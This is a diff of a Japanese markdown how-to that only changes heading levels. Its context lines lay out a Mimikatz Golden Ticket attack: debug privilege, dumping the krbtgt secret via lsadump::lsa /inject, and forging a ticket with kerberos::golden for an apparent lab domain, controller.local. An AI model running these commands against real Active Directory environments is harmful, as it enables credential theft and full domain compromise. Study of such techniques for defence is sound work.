@@ -166,11 +166,11 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt
 kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:
 ```
-## Golden Ticket 攻撃の実行手順
+### Golden Ticket 攻撃の実行手順
 
 この手順は、WindowsのActive Directory環境でGolden Ticket攻撃を実行するためのものです。**Golden Ticket**攻撃により、Kerberosチケットを偽造して管理者権限を取得することができます。
 
-### 1. Mimikatzの実行
+#### 1. Mimikatzの実行
 
 最初に、Mimikatzツールを実行します。
 
@@ -178,7 +178,7 @@ kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-8494
 .\mimikatz.exe
 ```
 
-### 2. 管理者権限の取得
+#### 2. 管理者権限の取得
 
 次に、Mimikatzに管理者権限を取得させます。
 
@@ -186,7 +186,7 @@ kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-8494
 privilege::debug
 ```
 
-### 3. `krbtgt`アカウントの暗号化キーの取得
+#### 3. `krbtgt`アカウントの暗号化キーの取得
 
 `krbtgt`アカウントのLSAシークレットをダンプして、暗号化キーを取得します。
 
@@ -194,7 +194,7 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt
 ```
 
-### 4. Golden Ticket の作成
+#### 4. Golden Ticket の作成
 
 `krbtgt`の暗号化キーを使用して、Golden Ticketを作成します。
 
